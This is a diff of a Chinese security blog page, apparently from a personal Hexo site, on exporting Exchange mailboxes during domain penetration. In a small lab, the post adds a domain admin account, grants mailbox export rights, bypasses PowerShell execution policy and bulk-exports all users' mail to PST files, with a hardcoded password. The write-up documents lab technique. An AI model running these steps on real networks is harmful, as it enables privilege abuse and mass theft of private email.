@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="域渗透,">
+  <meta name="keywords" content="EMS,Powershell,">
 
 
 
@@ -80,14 +80,14 @@
 
 
 <meta name="description" content="使用 Exchange Management Shell (EMS) 导出邮件">
-<meta name="keywords" content="域渗透">
+<meta name="keywords" content="EMS,Powershell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[域渗透]Exchange邮件导出">
 <meta property="og:url" content="http://yoursite.com/2019/08/13/域渗透-Exchange邮件导出/index.html">
 <meta property="og:site_name" content="ScarletF的小茅庐">
 <meta property="og:description" content="使用 Exchange Management Shell (EMS) 导出邮件">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-26T13:38:40.943Z">
+<meta property="og:updated_time" content="2019-08-27T13:58:42.151Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[域渗透]Exchange邮件导出">
 <meta name="twitter:description" content="使用 Exchange Management Shell (EMS) 导出邮件">
@@ -335,6 +335,28 @@
           </span>
 
           
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/域渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">域渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -372,43 +394,17 @@
       
 
       
-        <h1 id="使用-Exchange-Management-Shell-EMS-导出邮件"><a href="#使用-Exchange-Management-Shell-EMS-导出邮件" class="headerlink" title="使用 Exchange Management Shell (EMS) 导出邮件"></a>使用 Exchange Management Shell (EMS) 导出邮件</h1><a id="more"></a>
-<h3 id="一、测试环境"><a href="#一、测试环境" class="headerlink" title="一、测试环境"></a>一、测试环境</h3><table>
-<thead>
-<tr>
-<th>机器名</th>
-<th>IP</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>AD01</td>
-<td>192.168.20.10</td>
-<td>win server 2008 r2，域控</td>
-</tr>
-<tr>
-<td>Exchange01</td>
-<td>192.168.20.11</td>
-<td>win server 2008 r2，Exchange 2010，安装所有角色</td>
-</tr>
-<tr>
-<td>john-pc</td>
-<td>192.168.20.12</td>
-<td>window 7，域内个人机</td>
-</tr>
-</tbody>
-</table>
-<p>打开 PST 邮件，使用 <a href="https://www.nucleustechnologies.com/downloads/freekernelpstviewer.exe" target="_blank" rel="noopener">free kernel pst viewer</a></p>
+        <p>使用 Exchange Management Shell (EMS) 导出邮件<br><a id="more"></a></p>
+<h3 id="一、测试环境"><a href="#一、测试环境" class="headerlink" title="一、测试环境"></a>一、测试环境</h3><p><table><tr><th width="20%" style="text-align:center">机器名</th><th width="20%" style="text-align:center">IP</th><th width="60%" style="text-align:center">备注</th></tr><tr><td>AD01</td><td>192.168.20.10</td><td>win server 2008 r2，域控</td></tr><tr><td>Exchange01</td><td>192.168.20.11</td><td>win server 2008 r2，Exchange 2010，安装所有角色</td></tr><tr><td>john-pc</td><td>192.168.20.12</td><td>window 7，域内个人机</td></tr></table><br>打开 PST 邮件，使用 <a href="https://www.nucleustechnologies.com/downloads/freekernelpstviewer.exe" target="_blank" rel="noopener">free kernel pst viewer</a></p>
 <h3 id="二、基于-EMS-操作步骤"><a href="#二、基于-EMS-操作步骤" class="headerlink" title="二、基于 EMS 操作步骤"></a>二、基于 EMS 操作步骤</h3><blockquote>
 <p>需要在 Exchange01 服务器 UI 界面操作 and 打开 AD01 域控服务器</p>
 </blockquote>
 <ol>
 <li><p>在邮件服务器上打开 Exchange Management Shell</p>
 <ol>
-<li>打开 EMS 所需权限：Organization Management 组成员</li>
+<li>打开 EMS 所需权限：Organization Management 组成员<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 提升 &apos;scarlet&apos; 用户为域管权限 and 加入 Organization Management 组</span><br><span class="line">net user scarlet 123456 /add</span><br><span class="line">net group &quot;domain admins&quot; scarlet /add</span><br><span class="line">net group &quot;Organization Management&quot; scarlet /add</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 提升 &apos;scarlet&apos; 用户为域管权限 and 加入 Organization Management 组</span><br><span class="line">net user scarlet 123456 /add</span><br><span class="line">net group &quot;domain admins&quot; scarlet /add</span><br><span class="line">net group &quot;Organization Management&quot; scarlet /add</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>新建一个 Exchange 角色组并将其添加到 Mailbox Import Export 管理角色中</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个角色组名称为 "Enterprise Mail Support"，并将其赋予 "Mailbox Import Export" 角色权限，将 'scarlet' 用户加入到组成员</span></span><br><span class="line"><span class="comment"># 创建完成需要重启 EMS</span></span><br><span class="line">New-RoleGroup -Name <span class="string">"Enterprise Mail Support"</span> -Roles <span class="string">"Mailbox Import Export"</span> -Members scarlet -Description <span class="string">"Import Export_Enterprise Support"</span></span><br></pre></td></tr></table></figure>
@@ -468,7 +464,7 @@
 <p><strong>(2) 纯命令行操作</strong></p>
   <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过 Powershell 执行权限，执行 abc.ps1</span></span><br><span class="line">PowerShell -exec bypass -command <span class="string">". 'C:\programdata\abc.ps1'"</span> &gt; log.txt</span><br></pre></td></tr></table></figure>
 <p>  abc.ps1 内容如下，注释部分按需解除</p>
-  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"!QAZ2wsx"</span> -AsPlainText -Force</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 用户名即使没创建邮箱，也应写邮箱地址全称，如：scarlet@test.com</span></span><br><span class="line"><span class="variable">$Credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="string">"scarlet@test.com"</span>, <span class="variable">$pass</span>)</span><br><span class="line">  </span><br><span class="line"><span class="variable">$Session</span> = <span class="built_in">New-PSSession</span> -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential <span class="variable">$Credential</span></span><br><span class="line">  </span><br><span class="line"><span class="built_in">Import-PSSession</span> <span class="variable">$Session</span> -DisableNameChecking</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 获取所有用户邮件地址</span></span><br><span class="line"><span class="comment"># Get-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 添加导入导出角色</span></span><br><span class="line"><span class="comment"># New-RoleGroup –Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support"</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 按收发时间导出邮件，用户名在 all-email.csv 文件 'displayname' 列</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">  $mail = import-csv -path "c:\programdata\all-email.csv"</span></span><br><span class="line"><span class="comment">  foreach ($user in $mail)&#123; </span></span><br><span class="line"><span class="comment">  $Alias = $user.displayname</span></span><br><span class="line"><span class="comment">  New-MailboxExportRequest -ContentFilter &#123;((Sent -gt '07/15/2019 0:00:00') -and (Sent -lt '07/31/2019 23:59:59')) -or ((Received -gt '07/15/2019 0:00:00') -and (Received -lt '07/31/2019 23:59:59'))&#125; -Mailbox $Alias -FilePath "\\exchange01\test$\$Alias.pst"</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 清除已完成请求</span></span><br><span class="line"><span class="comment"># Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest</span></span><br><span class="line">  </span><br><span class="line"><span class="built_in">Remove-PSSession</span> <span class="variable">$Session</span></span><br></pre></td></tr></table></figure>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">"!QAZ2wsx"</span> -AsPlainText -Force</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 用户名即使没创建邮箱，也应写邮箱地址全称，如：scarlet@test.com</span></span><br><span class="line"><span class="variable">$Credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="string">"scarlet@test.com"</span>, <span class="variable">$pass</span>)</span><br><span class="line">  </span><br><span class="line"><span class="variable">$Session</span> = <span class="built_in">New-PSSession</span> -ConfigurationName Microsoft.Exchange -ConnectionUri http://exchange01.test.com/PowerShell/ -Authentication Kerberos -Credential <span class="variable">$Credential</span></span><br><span class="line">  </span><br><span class="line"><span class="built_in">Import-PSSession</span> <span class="variable">$Session</span> -DisableNameChecking</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 获取所有用户邮件地址</span></span><br><span class="line"><span class="comment"># Get-Mailbox -ResultSize Unlimited |select displayname,PrimarySmtpAddress</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 添加导入导出角色</span></span><br><span class="line"><span class="comment"># New-RoleGroup –Name "Enterprise Mail Support" -Roles "Mailbox Import Export" -Members scarlet -Description "Import Export_Enterprise Support"</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 按收发时间导出邮件，用户名在 all-email.csv 文件 'displayname' 列</span></span><br><span class="line"><span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">  $mail = import-csv -path "c:\programdata\all-email.csv"</span></span><br><span class="line"><span class="comment">  foreach ($user in $mail)&#123; </span></span><br><span class="line"><span class="comment">  $Alias = $user.displayname</span></span><br><span class="line"><span class="comment">  New-MailboxExportRequest -ContentFilter &#123;((Sent -gt '07/15/2019 0:00:00') -and (Sent -lt '07/31/2019 23:59:59')) -or ((Received -gt '07/15/2019 0:00:00') -and (Received -lt '07/31/2019 23:59:59'))&#125; -Mailbox $Alias -FilePath "\\exchange01\test$\$Alias.pst"</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 清除已完成请求</span></span><br><span class="line"><span class="comment"># Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Remove-PSSession</span> <span class="variable">$Session</span></span><br></pre></td></tr></table></figure>
 <h3 id="四、其它常用命令记录"><a href="#四、其它常用命令记录" class="headerlink" title="四、其它常用命令记录"></a>四、其它常用命令记录</h3><ol>
 <li><p>导出用户 Tony 在 2010 年 1 月 1 日之前收到的邮件正文中包含“公司”和“利润”的邮件。<br>有关如何使用 ContentFilter 参数的详细信息。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MailboxExportRequest -Mailbox Tony -ContentFilter &#123;(body <span class="nomarkup">-like</span> <span class="string">"*company*"</span>) -and (body <span class="nomarkup">-like</span> <span class="string">"*profit*"</span>) -and (Received <span class="nomarkup">-lt</span> <span class="string">"01/01/2010"</span>)&#125; -FilePath <span class="string">"\\SERVER01\PSTFileShare\Tony_CompanyProfits.pst"</span></span><br></pre></td></tr></table></figure>
@@ -495,7 +491,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
+            <a href="/tags/EMS/" rel="tag"># EMS</a>
+          
+            <a href="/tags/Powershell/" rel="tag"># Powershell</a>
           
         </div>
       
@@ -610,13 +608,22 @@
             
 
             
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
 
             
               
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -659,7 +666,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#使用-Exchange-Management-Shell-EMS-导出邮件"><span class="nav-text">使用 Exchange Management Shell (EMS) 导出邮件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、测试环境"><span class="nav-text">一、测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、基于-EMS-操作步骤"><span class="nav-text">二、基于 EMS 操作步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、基于远程-PowerShell-操作步骤"><span class="nav-text">三、基于远程 PowerShell 操作步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、其它常用命令记录"><span class="nav-text">四、其它常用命令记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五、参考文章"><span class="nav-text">五、参考文章</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一、测试环境"><span class="nav-text">一、测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二、基于-EMS-操作步骤"><span class="nav-text">二、基于 EMS 操作步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三、基于远程-PowerShell-操作步骤"><span class="nav-text">三、基于远程 PowerShell 操作步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#四、其它常用命令记录"><span class="nav-text">四、其它常用命令记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#五、参考文章"><span class="nav-text">五、参考文章</span></a></li></ol></div>
             
 
           </div>
